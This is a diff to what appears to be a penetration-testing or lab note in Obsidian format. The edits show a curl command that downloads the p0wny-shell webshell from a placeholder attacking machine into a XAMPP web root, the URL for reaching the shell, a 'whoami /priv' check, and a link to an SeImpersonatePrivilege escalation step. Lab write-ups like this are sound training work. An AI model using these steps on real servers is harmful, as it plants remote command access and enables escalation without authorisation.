@@ -11,11 +11,11 @@ This webshell provides more permissions than the ones you had obtained [[Vulnera
 2. Upload the file to `C:\xampp\htdocs\uploads\`.
 
 ```
-curl "http://<ATTACKING MACHINE>/p0wny-shell.php" -OutFile "C:\xampp\htdocs\uploads\p0wny-shell.php"
+curl "http://<ATTACKING MACHINE>/p0wny-shell.php" -OutFile "C:\xampp\htdocs\p0wny-shell.php"
 ```
 
 #Attacking_machine 
-3. Visit  `http://<MACHINE IP>.80:8080/p0wny-shell.php`.
+3. Visit  `http://<MACHINE IP>:8080/p0wny-shell.php`.
 	![[Screenshot_2025-10-31_07-23-03.png]]
 
 ## Discover privileges
@@ -31,3 +31,4 @@ whoami /priv
 
 ![[Screenshot_2025-10-31_07-26-12-1.png]]
 
+**Next step:** [[SeImpersonatePrivilege]]
